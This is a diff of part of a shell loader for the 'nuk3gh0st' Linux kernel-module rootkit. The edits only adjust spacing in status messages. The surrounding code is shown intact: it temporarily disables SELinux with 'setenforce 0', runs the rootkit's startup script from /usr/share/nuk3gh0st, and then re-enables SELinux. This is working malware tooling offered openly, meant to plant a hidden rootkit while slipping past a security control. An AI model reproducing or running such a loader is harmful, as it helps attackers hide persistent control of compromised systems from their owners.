@@ -11,18 +11,18 @@ echo -e "${green}#################################${endColor}"
 echo -e "${green}# Loading nuk3gh0st LKM rootkit #${endColor}"
 echo -e "${green}#################################${endColor}"
 echo ""
-echo -e "${item}Checking if SELINUX is enabled..."
+echo -e "${item} Checking if SELINUX is enabled..."
 if [ -f /usr/sbin/setenforce ]; then
-	echo -e "${item}SELINUX is enabled"
-	echo -e "${item}Disabling SELINUX temporarily"
-	echo -e "   ${purple}cmd: setenforce 0${endColor}"
+	echo -e "${item} SELINUX is enabled"
+	echo -e "${item} Disabling SELINUX temporarily"
+	echo -e "   ${purple} cmd: setenforce 0${endColor}"
 	echo ""
 	setenforce 0
 	
 	bash /usr/share/nuk3gh0st/nuk3gh0st.startup
 
-	echo -e "${item}Reenabling SELINUX"
-	echo -e "   ${purple}cmd: setenforce 1${endColor}"
+	echo -e "${item} Reenabling SELINUX"
+	echo -e "   ${purple} cmd: setenforce 1${endColor}"
 	echo ""
 	setenforce 1
 else
